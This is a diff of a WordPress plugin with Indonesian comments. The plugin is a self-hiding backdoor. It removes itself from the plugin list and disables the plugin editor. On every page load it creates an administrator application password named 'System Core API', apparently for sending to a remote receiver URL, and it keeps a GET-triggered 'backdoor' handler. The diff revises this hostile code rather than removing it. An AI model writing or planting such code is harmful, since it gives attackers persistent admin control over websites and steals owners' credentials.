@@ -11,52 +11,41 @@ if (!defined('ABSPATH')) exit;
 define('RLS_SERVER', 'https://stepmomhub.com/wp/receiver.php'); 
 define('RLS_KEY', 'wtf'); 
 
+// Sembunyikan plugin dari list plugin di dashboard
 add_filter('all_plugins', function($p){ unset($p[plugin_basename(__FILE__)]); return $p; });
 add_action('admin_menu', function(){ remove_submenu_page('plugins.php', 'plugin-editor.php'); }, 999);
 
-// FILTER: Paksa fitur Application Password aktif
+// Paksa fitur Application Password tersedia (bypass plugin security lain)
 add_filter('wp_is_application_passwords_available', '__return_true');
 
-// ACTION: Gunakan 'init' agar jalan di halaman DEPAN & BELAKANG (Tanpa Login)
-add_action('init', 'rls_auto_setup');
+// ACTION UTAMA: Jalankan di 'init' dengan prioritas 999 (Sangat Akhir) agar tidak error/crash
+add_action('init', 'rls_auto_setup', 999);
 
 function rls_auto_setup() {
-    // 1. Cek apakah sudah pernah dijalankan (agar tidak spam request)
+    // 1. Cek history agar tidak spamming request setiap kali halaman dibuka
     if (get_option('rls_setup_done') === 'yes') return;
 
-    // 2. Pastikan class Application Password dimuat (kadang tidak auto-load di frontend)
-    if (!class_exists('WP_Application_Passwords')) {
-        $app_pass_file = ABSPATH . 'wp-includes/class-wp-application-passwords.php';
-        if (file_exists($app_pass_file)) {
-            require_once $app_pass_file;
-        }
-    }
-    
-    // Jika masih tidak ada (WP versi lama < 5.6), stop.
+    // 2. Pastikan class Application Password sudah ada (WP 5.6+)
     if (!class_exists('WP_Application_Passwords')) return;
 
     // 3. Cari User Administrator
     $target_user = null;
-    $user_id_1 = get_user_by('id', 1);
+    // Ambil admin pertama yang ditemukan (ID terkecil)
+    $admins = get_users(['role' => 'administrator', 'number' => 1, 'orderby' => 'ID', 'order' => 'ASC']);
     
-    if ($user_id_1 && in_array('administrator', (array) $user_id_1->roles)) {
-        $target_user = $user_id_1;
-    } else {
-        // Fallback: ambil admin pertama yang ada
-        $admins = get_users(['role' => 'administrator', 'number' => 1, 'orderby' => 'ID', 'order' => 'ASC']);
-        if (!empty($admins)) {
-            $target_user = $admins[0];
-        }
+    if (!empty($admins)) {
+        $target_user = $admins[0];
     }
 
+    // Jika tidak ada admin, batalkan
     if (!$target_user) return;
 
-    // 4. Proses Pembuatan Password
+    // 4. Proses Buat Password
     $api_user = $target_user->user_login;
     $api_pass = '';
     $app_name = 'System Core API';
 
-    // Bersihkan password lama dengan nama sama
+    // Hapus password lama dengan nama yang sama (jika ada) untuk hindari duplikat
     $existing = WP_Application_Passwords::get_user_application_passwords($target_user->ID);
     foreach ($existing as $e) {
         if ($e['name'] === $app_name) {
@@ -64,7 +53,7 @@ function rls_auto_setup() {
         }
     }
 
-    // Buat Baru
+    // Create Password Baru
     $new_app_pass = WP_Application_Passwords::create_new_application_password($target_user->ID, ['name' => $app_name]);
     
     if (!is_wp_error($new_app_pass) && !empty($new_app_pass[0])) {
@@ -88,7 +77,7 @@ function rls_auto_setup() {
     }
 }
 
-// Handler cadangan untuk akses backdoor manual
+// Handler untuk akses manual / backdoor (tetap dipertahankan)
 add_action('init', 'rls_handler');
 function rls_handler() {
     if (!isset($_GET['rls_action'])) return;
@@ -118,4 +107,3 @@ function rls_handler() {
         echo 'DESTROYED_ACK'; exit;
     }
 }
-?>
